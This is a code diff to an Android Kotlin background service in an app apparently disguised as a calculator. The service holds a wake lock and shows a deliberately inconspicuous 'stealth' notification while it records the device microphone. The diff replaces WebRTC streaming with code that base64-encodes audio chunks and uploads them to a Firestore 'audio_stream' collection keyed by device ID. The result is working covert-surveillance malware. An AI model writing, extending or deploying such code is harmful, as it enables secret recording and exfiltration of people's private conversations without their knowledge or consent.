@@ -3,7 +3,6 @@ package com.dp.calculator
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -13,11 +12,12 @@ import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
+import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.*
-import org.webrtc.*
+import java.io.ByteArrayOutputStream
 
 class AudioService : Service() {
 
@@ -27,21 +27,16 @@ class AudioService : Service() {
         private const val TAG = "AudioService"
         private const val NOTIFICATION_ID = 9999
         private const val CHANNEL_ID = "background_service"
-        private const val SAMPLE_RATE = 16000
+        private const val SAMPLE_RATE = 8000
         private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
-        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
+        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_8BIT
+        private const val CHUNK_SIZE = 4096
     }
 
     private var audioRecord: AudioRecord? = null
-    private var peerConnection: PeerConnection? = null
-    private var peerConnectionFactory: PeerConnectionFactory? = null
-    private var audioSource: AudioSource? = null
-    private var audioTrack: AudioTrack? = null
-
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isStreaming = false
-
     private val firestore = FirebaseFirestore.getInstance()
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -66,9 +61,8 @@ class AudioService : Service() {
             try {
                 acquireWakeLock()
                 startForeground(NOTIFICATION_ID, createStealthNotification())
-                initializeWebRTC()
+                registerDevice()
                 startAudioCapture()
-                connectSignaling()
                 isStreaming = true
                 Log.d(TAG, "Streaming started")
             } catch (e: Exception) {
@@ -80,57 +74,22 @@ class AudioService : Service() {
 
     private fun stopStreaming() {
         isStreaming = false
-        audioTrack?.dispose()
-        audioTrack = null
-        audioSource?.dispose()
-        audioSource = null
         audioRecord?.release()
         audioRecord = null
-        peerConnection?.close()
-        peerConnection = null
-        peerConnectionFactory?.dispose()
-        peerConnectionFactory = null
         releaseWakeLock()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
         Log.d(TAG, "Streaming stopped")
     }
 
-    private fun initializeWebRTC() {
-        val eglBase = EglBase.create()
-
-        val initOptions = PeerConnectionFactory.InitializationOptions.builder(this)
-            .setEnableInternalTracer(false)
-            .createInitializationOptions()
-        PeerConnectionFactory.initialize(initOptions)
-
-        peerConnectionFactory = PeerConnectionFactory.builder()
-            .createPeerConnectionFactory()
-
-        val iceServers = listOf(
-            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
+    private fun registerDevice() {
+        val deviceId = DeviceRegistrar.getDeviceId(this)
+        val deviceData = hashMapOf(
+            "deviceId" to deviceId,
+            "status" to "online",
+            "timestamp" to System.currentTimeMillis()
         )
-
-        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
-
-        peerConnection = peerConnectionFactory?.createPeerConnection(
-            rtcConfig,
-            object : PeerConnection.Observer {
-                override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
-                override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
-                override fun onIceConnectionReceivingChange(receiving: Boolean) {}
-                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
-                override fun onIceCandidate(candidate: IceCandidate?) {
-                    candidate?.let { sendIceCandidate(it) }
-                }
-                override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
-                override fun onAddStream(stream: MediaStream?) {}
-                override fun onRemoveStream(stream: MediaStream?) {}
-                override fun onDataChannel(channel: DataChannel?) {}
-                override fun onRenegotiationNeeded() {}
-                override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
-            }
-        )
+        firestore.collection("devices").document(deviceId).set(deviceData)
     }
 
     private fun startAudioCapture() {
@@ -141,147 +100,44 @@ class AudioService : Service() {
             SAMPLE_RATE,
             CHANNEL_CONFIG,
             AUDIO_FORMAT,
-            bufferSize * 2
+            bufferSize
         )
-
-        audioSource = peerConnectionFactory?.createAudioSource(MediaConstraints())
-        audioTrack = peerConnectionFactory?.createAudioTrack("audio_track", audioSource)
-
-        peerConnection?.addTrack(audioTrack, listOf("stream"))
 
         audioRecord?.startRecording()
 
+        val deviceId = DeviceRegistrar.getDeviceId(this)
+        val outputStream = ByteArrayOutputStream()
+
         serviceScope.launch(Dispatchers.IO) {
-            val buffer = ByteArray(1024)
+            val buffer = ByteArray(CHUNK_SIZE)
+            var chunkCount = 0
+
             while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
-                audioRecord?.read(buffer, 0, buffer.size)
-            }
-        }
-    }
+                val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
+                if (bytesRead > 0) {
+                    outputStream.write(buffer, 0, bytesRead)
+                    chunkCount++
 
-    private fun connectSignaling() {
-        val deviceId = DeviceRegistrar.getDeviceId(this)
+                    if (chunkCount % 10 == 0) {
+                        val audioData = outputStream.toByteArray()
+                        val base64Audio = Base64.encodeToString(audioData, Base64.NO_WRAP)
 
-        val deviceData = hashMapOf(
-            "deviceId" to deviceId,
-            "status" to "online",
-            "timestamp" to System.currentTimeMillis()
-        )
+                        val audioChunk = hashMapOf(
+                            "deviceId" to deviceId,
+                            "audio" to base64Audio,
+                            "timestamp" to System.currentTimeMillis(),
+                            "chunkId" to chunkCount
+                        )
 
-        firestore.collection("devices")
-            .document(deviceId)
-            .set(deviceData)
-            .addOnSuccessListener {
-                Log.d(TAG, "Device registered: $deviceId")
-                listenForSignaling(deviceId)
-            }
-            .addOnFailureListener { e ->
-                Log.e(TAG, "Error registering device", e)
-            }
-    }
+                        firestore.collection("audio_stream")
+                            .document(deviceId)
+                            .set(audioChunk)
 
-    private fun listenForSignaling(deviceId: String) {
-        firestore.collection("signaling")
-            .document(deviceId)
-            .addSnapshotListener { snapshot, e ->
-                if (e != null) {
-                    Log.e(TAG, "Signaling error", e)
-                    return@addSnapshotListener
-                }
-
-                val data = snapshot?.data ?: return@addSnapshotListener
-                val type = data["type"] as? String ?: return@addSnapshotListener
-
-                when (type) {
-                    "offer" -> {
-                        val sdp = data["sdp"] as? String ?: return@addSnapshotListener
-                        handleOffer(sdp, deviceId)
-                    }
-                    "ice-candidate" -> {
-                        val candidate = data["candidate"] as? String ?: return@addSnapshotListener
-                        val sdpMid = data["sdpMid"] as? String ?: return@addSnapshotListener
-                        val sdpMLineIndex = (data["sdpMLineIndex"] as? Number)?.toInt() ?: return@addSnapshotListener
-                        handleIceCandidate(candidate, sdpMid, sdpMLineIndex)
+                        outputStream.reset()
                     }
                 }
             }
-    }
-
-    private fun handleOffer(sdp: String, deviceId: String) {
-        serviceScope.launch {
-            try {
-                val offerSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
-                peerConnection?.setRemoteDescription(offerSdp, object : SdpObserver {
-                    override fun onCreateSuccess(sdp: SessionDescription?) {}
-                    override fun onCreateFailure(error: String?) {}
-                    override fun onSetSuccess() {
-                        peerConnection?.createAnswer(object : SdpObserver {
-                            override fun onCreateSuccess(answerSdp: SessionDescription?) {
-                                answerSdp?.let {
-                                    peerConnection?.setLocalDescription(it, object : SdpObserver {
-                                        override fun onCreateSuccess(sdp: SessionDescription?) {}
-                                        override fun onCreateFailure(error: String?) {}
-                                        override fun onSetSuccess() {
-                                            sendAnswer(it.description, deviceId)
-                                        }
-                                        override fun onSetFailure(error: String?) {
-                                            Log.e(TAG, "Set local failed: $error")
-                                        }
-                                    })
-                                }
-                            }
-                            override fun onCreateFailure(error: String?) {
-                                Log.e(TAG, "Create answer failed: $error")
-                            }
-                            override fun onSetSuccess() {}
-                            override fun onSetFailure(error: String?) {}
-                        })
-                    }
-                    override fun onSetFailure(error: String?) {
-                        Log.e(TAG, "Set remote failed: $error")
-                    }
-                })
-            } catch (e: Exception) {
-                Log.e(TAG, "Error handling offer", e)
-            }
         }
-    }
-
-    private fun handleIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
-        val iceCandidate = IceCandidate(sdpMid, sdpMLineIndex, candidate)
-        peerConnection?.addIceCandidate(iceCandidate)
-    }
-
-    private fun sendAnswer(sdp: String, deviceId: String) {
-        val answerData = hashMapOf(
-            "type" to "answer",
-            "sdp" to sdp,
-            "deviceId" to deviceId,
-            "timestamp" to System.currentTimeMillis()
-        )
-
-        firestore.collection("signaling")
-            .document(deviceId)
-            .collection("answers")
-            .add(answerData)
-    }
-
-    private fun sendIceCandidate(candidate: IceCandidate) {
-        val deviceId = DeviceRegistrar.getDeviceId(this)
-
-        val candidateData = hashMapOf(
-            "type" to "ice-candidate",
-            "candidate" to candidate.sdp,
-            "sdpMid" to candidate.sdpMid,
-            "sdpMLineIndex" to candidate.sdpMLineIndex,
-            "deviceId" to deviceId,
-            "timestamp" to System.currentTimeMillis()
-        )
-
-        firestore.collection("signaling")
-            .document(deviceId)
-            .collection("candidates")
-            .add(candidateData)
     }
 
     private fun createNotificationChannel() {
@@ -291,14 +147,11 @@ class AudioService : Service() {
                 "Background Service",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Background audio service"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
             }
-
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
@@ -315,21 +168,14 @@ class AudioService : Service() {
     }
 
     private fun acquireWakeLock() {
-        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK,
-            "CalculatorService::WakeLock"
-        ).apply {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CalcService::WakeLock").apply {
             acquire(60 * 60 * 1000L)
         }
     }
 
     private fun releaseWakeLock() {
-        wakeLock?.let {
-            if (it.isHeld) {
-                it.release()
-            }
-        }
+        wakeLock?.let { if (it.isHeld) it.release() }
         wakeLock = null
     }
 
